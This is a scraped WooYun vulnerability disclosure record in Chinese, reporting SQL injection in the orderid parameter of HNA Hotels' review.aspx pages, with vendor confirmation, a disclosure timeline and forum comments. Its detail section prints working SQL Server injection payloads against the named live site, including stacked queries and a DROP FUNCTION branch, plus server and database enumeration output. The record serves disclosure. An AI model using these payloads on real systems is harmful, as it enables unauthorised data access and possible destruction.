{"id": 58147, "wybug_id": "wooyun-2014-052169", "wybug_title": "海航酒店两处GET SQL注射漏洞", "wybug_corp": "hnahotelsandresorts.com", "wybug_author": "niliu", "wybug_date": "2014-03-03 14:55", "wybug_open_date": "2014-04-17 14:56", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-17：\t细节向公众公开  简要描述： 注射还真不少 详细说明：  第一处：\nhttp://www.hnahotelsandresorts.com/destinations/review.aspx?orderid=\n\n\norderid参数过滤不严导致注射\nPlace: GETParameter: orderid    Type: boolean-based blind    Title: Microsoft SQL Server/Sybase stacked conditional-error blind queries    Payload: orderid=1'; IF(9209=9209) SELECT 9209 ELSE DROP FUNCTION qQJA--    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: orderid=1' AND 8376=CONVERT(INT,(SELECT CHAR(113)+CHAR(114)+CHAR(118)+CHAR(105)+CHAR(113)+(SELECT (CASE WHEN (8376=8376) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(121)+CHAR(117)+CHAR(109)+CHAR(113))) AND 'DnLR'='DnLR    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: orderid=1'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: orderid=1' WAITFOR DELAY '0:0:5'--\n\nweb server operating system: Windows 2008web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008\n\navailable databases [15]:[*] GPweb1_en[*] GPweb_cs[*] GroupWebDB[*] GSTS[*] master[*] model[*] msdb[*] NBCRS[*] OTADB[*] PMS[*] ReportServer[*] ReportServerTempDB[*] RMS[*] TangoReport[*] tempdb\n\n\n-----------------------------------------------------------------------------------第二处：\nhttp://en.hnahotelsandresorts.com/destinations/review.aspx?orderid=\n 英文站\n\n同样的参数同样存在问题\n\n   漏洞证明：  \n\n\n\n   修复方案：  过滤！   版权声明：转载请注明来源 niliu@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2014-03-05 15:40 厂商回复： 谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-03 10:39 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @疯狗 @Finger 这个漏洞转到 hnair.com 吧。谢谢！    \n     2014-03-03 11:04 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @niliu 厂商仍为注册呢    \n     2014-03-03 11:13 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @疯狗  WooYun: 海航酒店某处POST SQL注射漏洞  这个都已经确认了啊    \n     2014-03-03 14:56 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @niliu 了解了~已改，还有么？    \n     2014-03-03 15:02 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @疯狗 谢啦。还有就是为什么这两个洞的厂商和  WooYun: 海航酒店某处POST SQL注射漏洞  不是同一个而且还都是小厂商    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}